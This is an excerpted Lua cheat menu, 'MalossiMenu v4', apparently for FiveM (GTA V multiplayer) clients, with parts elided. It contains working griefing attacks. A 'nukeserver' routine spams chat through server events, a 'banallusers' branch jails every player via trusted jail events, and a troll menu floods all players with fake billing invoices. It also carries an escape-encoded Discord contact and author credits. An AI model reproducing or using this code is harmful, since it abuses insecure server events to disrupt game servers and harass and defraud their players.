...
function teleportToNearestVehicle()
    ...
    Citizen.CreateThread(function()
        while discordPresence do
            ...
            SetDiscordRichPresenceAsset("6666")

            --(11-11-2018) New Natives:

            --Here you can add hover text for the "large" icon.
            SetDiscordRichPresenceAssetText("MalossiMenu v4 | BY: | \102\111\114\105\118\35\55\48\51\49\32 | to get it")

            --Here you will have to put the image name for the "small" icon.
            SetDiscordRichPresenceAssetSmall("6666")

            --Here you can add hover text for the "small" icon.
            SetDiscordRichPresenceAssetSmallText("Contact | \102\111\114\105\118\35\55\48\51\49\32 | to get it")
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Gh0st; MalossiHosting#2143 ")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'MalossiHosting#2143 ',
                    {0, 0x99, 255},
                    '/ddddddddddddd MalossiMenu v4'
                )
                TriggerServerEvent('_chat:messageEntered', 'MalossiHosting#2143 ', {0, 0x99, 255}, 'MalossiMenu v4 <3')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Malossi BO$$ <3 MalossiHosting#2143 ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Malossi<3 MalossiHosting#2143 ")
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "MalossiMenu v4")
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Malossi ~s~Menu")
                drawNotification("~h~~s~Edit by ~b~MalossiHosting#2143 ")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu v4", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu v4", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu v4", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu v4", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu v4", "6969696969")
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
                ...
                elseif Plane.Button("Spawn a vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "Malossi")
                    else
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.IsMenuOpened("Credits") then
				    if Plane.Button("∑~r~~h~MalossiHosting#2143  - Editor") then
				elseif Plane.Button("∑~o~~h~MalossiHosting#2143  - Owner") then
				elseif Plane.Button("∑~h~MalossiMenu v4 <3") then
				end
				Plane.Display()
